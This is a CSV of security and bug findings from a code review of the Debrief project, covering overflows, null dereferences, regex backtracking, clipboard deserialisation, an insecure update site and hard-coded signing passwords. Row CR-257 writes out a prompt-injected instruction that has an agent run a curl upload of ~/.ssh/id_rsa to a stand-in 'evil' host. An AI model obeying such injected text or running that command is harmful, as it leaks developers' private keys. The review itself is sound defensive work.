id,slice,plugin,package,class,file_path,category,issue_type,severity,confidence,status,title,description,instances,trigger_input,suggested_fix,effort,llm_value,related,github_issue
CR-249,A8,org.mwc.asset.legacy,ASSET.Scenario.Observers,StopOnElapsedObserver,org.mwc.asset.legacy/src/ASSET/Scenario/Observers/StopOnElapsedObserver.java,bug,integer-overflow,Low,High,candidate,Elapsed duration computed in int milliseconds overflows for >= 25 days,"The (days,hours,mins,secs) constructor computes days*24*60*60*1000 in int arithmetic (L132); 25 days exceeds Integer.MAX_VALUE, so the observer either stops immediately (negative) or at a wrong time.",L130-L134,"StopOnElapsedObserver(25,0,0,0,...) from a scenario XML.",Use long arithmetic (24L * 60 * 60 * 1000).,S,grep-able,-,
CR-250,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.NMEA,ImportNMEA,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/NMEA/ImportNMEA.java,security,performance,Low,Medium,candidate,Multi-wildcard $POSL regexes allow polynomial backtracking on hostile lines; ...,"osPattern, aisPattern, coursePattern* and speedPattern* contain two or more unanchored '.*' segments applied with matches() to every line of the type (e.g. osPattern L448-449 '\$POSL,(?<SOURCE>\w?POS\d?,.*),(?<LAT>...),(?<LONG>...),.*'). A long non-matching line of commas ('$POSL,POS,GPS,' followed by ~1e5 commas) forces O(n^2)-O(n^3) backtracking before rejection, hanging the import thread; readLine has no line-length cap. The '*hh' NMEA checksum is never validated, so corrupted sentences are accepted.",L403-L449; L750-L752,"NMEA text file containing one 200 KB line beginning '$POSL,POS,GPS,' followed by repeated ',,,,'","Reject lines longer than a sane NMEA maximum (e.g. 1024 chars) before regex matching, replace '.*' between fixed comma-separated fields with '[^,]*', and validate the NMEA XOR checksum.",M,Requires reasoning about regex backtracking complexity rather than pattern grep.,-,
CR-251,A10,org.mwc.cmap.plotViewer,org.mwc.cmap.plotViewer.editors,CorePlotEditor,org.mwc.cmap.plotViewer/src/org/mwc/cmap/plotViewer/editors/CorePlotEditor.java,bug,null-deref,Low,High,candidate,getFixedFilePath builds new File(null) and removeSelectionChangedListener on ...,"When the tif referenced by a .dpf is missing and the editor input is neither IFileEditorInput nor FileStoreEditorInput, tiffFilePath stays null and new File(tiffFilePath) throws NPE inside Layers.addThisLayer during file load. When not found it returns the original (non-existent) name so a WorldImageLayer is still created. removeSelectionChangedListener dereferences _selectionListeners which is lazily created only in add.",L781-L815; L976-L978,".dpf referencing a GeoTiff path that does not exist, opened from a FileRevisionEditorInput (history view)",Return null early when tiffFilePath is null and skip creating the layer; null-check _selectionListeners.,S,grep-able,-,
CR-252,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,CopyBearingsToClipboard,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/CopyBearingsToClipboard.java,security,unsafe-deserialization,Low,Low,unverified-needs-runtime,Java-serialized BearingList read back from the system clipboard,"TransferableBearingList uses DataFlavor(BearingList.class,...) i.e. application/x-java-serialized-object, and generatePasteAction calls clip.getData(FLAVOR) on every right-click. When the clipboard owner is another process AWT deserialises the native bytes with ObjectInputStream, so a malicious clipboard payload placed by any local application is deserialised inside Debrief whenever the analyst opens a track context menu.",L525-L557; L707-L717,"Another local process places application/x-java-serialized-object data on the clipboard, then right-click a track","Use a JVM-local flavour (DataFlavor.javaJVMLocalObjectMimeType) or a text encoding, and only accept in-process content.",S,Requires knowledge of AWT DataTransferer deserialisation of serialized-object flavours.,-,
CR-253,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,GenerateNewInsertSensorArcAction,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/GenerateNewInsertSensorArcAction.java,bug,logic-error,Low,Medium,candidate,Nested undoable operation executed from inside execute(); undo does not refre...,"InsertSensorArcOperation.execute creates a CreateLabelAction and runs it via CorePlugin.run(daw), which adds a second, independent entry to the operation history while the outer operation is itself being executed by the history. Undo of the outer removes the shape via _track.removeElement without firing a Layers event, while the inner entry's undo removes it again.",L76-L106; L114-L118,"Insert new Sensor Arc on a track, then Undo twice and watch the Outline/plot",Call the action's execute()/undo() directly inside the outer operation and fire _layers.fireExtended in undo.,S,Requires understanding IOperationHistory semantics of nested execute.,-,
CR-254,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,GenerateTMASegmentFromInfillSegment,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/GenerateTMASegmentFromInfillSegment.java,bug,null-deref,Low,Medium,candidate,Null target speed when solution page incomplete; partial selection accepted,"In run(), speed stays null unless the EnterSolutionPage reports complete, and is passed to AbsoluteTMASegment, whose speed accessors will NPE later. In generate(), a non-FixWrapper item causes break rather than abort, so a mixed selection still yields an action covering only the fixes seen so far.",L248-L265; L220-L222,"Select two infill fixes, run the action and press Finish from the offset page without completing the course/speed page",Default speed to DEFAULT_TARGET_SPEED and return from generate() on non-FixWrapper items.,S,grep-able,-,
CR-255,A10,org.mwc.debrief.lite,org.mwc.debrief.lite,DebriefLiteApp,org.mwc.debrief.lite/src/main/java/org/mwc/debrief/lite/DebriefLiteApp.java,bug,resource-leak,Low,High,candidate,FileInputStream left open when dropped file is not a Nisida file,"FilesReceived opens a FileInputStream to probe ImportNisida.canLoadThisFile and closes it only on the true branch; on false or exception the stream leaks, which on Windows keeps the dropped file locked.",L1092-L1099,Drag a .csv or other unsupported file onto the Lite map,Use try-with-resources around the probe.,S,grep-able,-,
CR-256,A10,org.mwc.debrief.lite,org.mwc.debrief.lite.gui.custom,RangeSlider,org.mwc.debrief.lite/src/main/java/org/mwc/debrief/lite/gui/custom/RangeSlider.java,bug,integer-overflow,Low,High,candidate,Time slider stores epoch seconds in int (Y2038) and truncates sub-second times,"toInt divides millis by 1000 and casts to int, overflowing for dates after 2038-01-19 and collapsing sub-second fixes to one slider position; SliderCompContMdl uses the same conversion. Data files with far-future or test timestamps make the slider wrap negative.",L43; L64,.rep with fixes dated 2040-01-01,Store offsets from the period start in seconds (fits int for any realistic scenario) or use a long-backed model.,S,grep-able,SliderCompContMdl.java L171,
CR-257,A11,.claude,-,settings.local.json,.claude/settings.local.json,security,logic-error,Low,High,candidate,Checked-in Claude settings pre-approve unrestricted curl,"Real type: over-broad agent tool permission. L7 `Bash(curl:*)` auto-allows any curl invocation for every developer who opens the repo in Claude Code, including uploads (`-T`, `-d @file`) of workspace contents to arbitrary hosts and `curl | sh` patterns, with no prompt. A `.local.json` file is meant to be per-developer and is normally gitignored; committing it applies the grant to everyone.",L7,Prompt-injected instruction in a data file or PR that asks the agent to `curl -T ~/.ssh/id_rsa https://evil`.,"Remove settings.local.json from git (add to .gitignore), or narrow to read-only patterns such as `Bash(curl -s https://api.github.com/*)`.",S,grep-able.,-,
CR-258,A11,.claude,-,SKILL.md,.claude/skills/release/SKILL.md,ci-workflow,logic-error,Low,High,candidate,Release skill's 'tag exists' guard does not stop; tag message placeholder is ...,"Step 8 (L134-138) runs `git rev-parse --verify ""refs/tags/$TAG"" && echo ""TAG EXISTS - STOP""` which only prints; execution continues to `git tag -a` (which then fails) and `git push origin ""$TAG""`, the irreversible step the skill says to protect. L137 `-m ""Debrief $(...marketing version...)""` is a literal placeholder that bash cannot execute. RELEASING.md L82-84 has the same flow without the guard.",L134-138,Running step 8 verbatim when the tag already exists locally.,"Use `if git rev-parse -q --verify ""refs/tags/$TAG"" >/dev/null; then echo 'TAG EXISTS'; exit 1; fi` and `-m ""Debrief $(python3 contribs/PyScripts/release_versions.py tag-name)""` or the marketing version read from about.mappings.",S,Requires reading the shell snippet as executed code rather than prose.,-,
CR-259,A11,contribs,-,release_versions.py,contribs/PyScripts/release_versions.py,bug,string-parsing,Low,High,candidate,--date parsing and GitHub tag_name are unvalidated; bad input gives a traceback,"_parse_date (L477-478) slices text[0:4]/[4:6]/[6:8] with no length or format check, so `--date 2025-09-23` or `--date 202509` raises ValueError from argparse/date, not a ReleaseError, and the friendly error path (L567-573) is bypassed. latest_release_tag (L242-265) returns the API `tag_name` without checking TAG_PATTERN (L37), so a manually created non-release-shaped GitHub release becomes the diff baseline.",L37; L242-265; L477-478,`release_versions.py plan --date 2025-09-23`.,"Use `datetime.strptime(text, '%Y%m%d')` inside argparse `type` with a clear error, and validate tag_name against TAG_PATTERN before use.",S,grep-able.,-,
CR-260,A11,contribs,-,make_x64msi.sh,contribs/msi/make_x64msi.sh,bug,logic-error,Low,High,candidate,MSI script 'exits on failure' with status 0 and has no set -e,"L60-61 print 'PROBLEM ... exiting' then `exit $?`, but `$?` is the exit status of the preceding `echo` (0), so a missing MSI exits successfully; the script also lacks `set -e`, so failures of wixl-heat (L47) or wixl (L53) are ignored until the final `mv` (L65). L21 `sed -i` rewrites the tracked Debrief64.wxs in place so the script is not idempotent (second run finds no `versionReplacement`).",L21; L47; L53; L56-62; L65,wixl fails on a harvest error: script reports PROBLEM and exits 0.,"Add `set -euo pipefail`, use `exit 1` in the failure branch, and write the versioned .wxs to a temp copy.",S,grep-able.,-,
CR-261,A11,org.mwc.debrief.build,-,build361.xml,org.mwc.debrief.build/build361.xml,ci-workflow,dead-code,Low,High,candidate,Legacy PDE/Ant build and SourceForge scp upload are dead and misleading,"build361.xml drives an Eclipse 3.6 PDE headless build (deltapack, L36-45) with javacSource/Target 1.6 (build361.properties L129-132) and a 32-bit-only config (L39), none of which the Tycho build uses; `uploadToSF` (L93-128) scps to frs.sourceforge.net with a password taken from the environment and a hard-coded account (L124), and copy_to_usb/copy_zip_to_cd target personal paths (L173, L192, L207). Nothing references these files; they mislead about how releases are built and distributed.",L30-50; L93-128; L171-214; build361.properties L39; L129-132,Reader of org.mwc.debrief.build assumes SourceForge is a release channel.,Delete org.mwc.debrief.build/build361.* and legacy/ (or move to docs/history) and keep only the checkstyle configuration.,S,grep-able.,-,
CR-262,A11,org.mwc.debrief.product,-,debriefng.product,org.mwc.debrief.product/debriefng.product,security,ssrf-or-unvalidated-url,Low,Medium,unverified-needs-runtime,"Shipped product's p2 update site is `http://debrief/`, an unqualified clearte...","L266 `<repository location=""http://debrief/"" enabled=""true""/>` is baked into every installed DebriefNG as an enabled update site. The single-label name is resolved via search-domain suffixing, LLMNR/mDNS or NetBIOS on the analyst's network, so any host that claims the name `debrief` can serve a p2 repository over http; 'Check for Updates' would then offer attacker bundles (unsigned-content warning only). It is also clearly a placeholder that was never replaced.",L265-267,Analyst on a LAN runs Help > Check for Updates while a rogue host answers for `debrief`.,Remove the repository element or point it at the real https update site; consider `org.eclipse.equinox.p2.ui.sdk.scheduler` disabled if no site exists.,S,Needs recognising that a product-file repository entry becomes a live update source on end-user machines.,-,
CR-263,A11,root,-,pom.xml,pom.xml,security,secrets-handling,Low,High,candidate,Jar-signing profile hard-codes keystore and key passwords in the pom,"The `sign` profile (L252-289) feeds `${debrief.keystore.store.password}`/`${debrief.keystore.key.password}` to maven-jarsigner-plugin, and L22-25 define them in the pom as `store123`/`key123` with `~/debrief.keystore`. If a developer follows the L17-19 comment and creates a real signing key with these defaults, the signing secret is effectively public; if not, the profile is dead and misleads about whether release jars are signed (main.yml never passes -Dsignjar=true, so nothing is signed).",L17-25; L252-289,`mvn verify -Dsignjar=true` with a keystore generated per the comment.,"Remove the default passwords, require them via `-D`/settings.xml server entries or CI secrets, and document that release artifacts are currently unsigned (or wire signing into the tag build).",S,grep-able.,-,
CR-264,A11,root,-,pom.xml,pom.xml,supply-chain,outdated-dependency,Low,High,candidate,"Build plugins pinned to old versions (Tycho 2.7.0, jarsigner-plugin 1.2, jmoc...","L12-13 tycho 2.7.0 (Feb 2022; Tycho 4.x is current and 2.x is unsupported), L265 maven-jarsigner-plugin 1.2 (2011; 3.x current), L186/L191 jmock 2.5.1 (2008), org.mwc.debrief.product/pom.xml L75 maven-antrun-plugin 1.7 (2011), and L169 passes `-XX:PermSize`/`-XX:MaxPermSize` which are ignored/warned on Java 8+. Old Tycho also fixes the resolvable Eclipse platform at 4.22 (target L151).",L12-13; L169; L186; L191; L265; org.mwc.debrief.product/pom.xml L75,mvn build output: 'Ignoring option MaxPermSize'.,Move to a supported Tycho line and current plugin versions; drop the PermSize flags.,M,grep-able.,-,
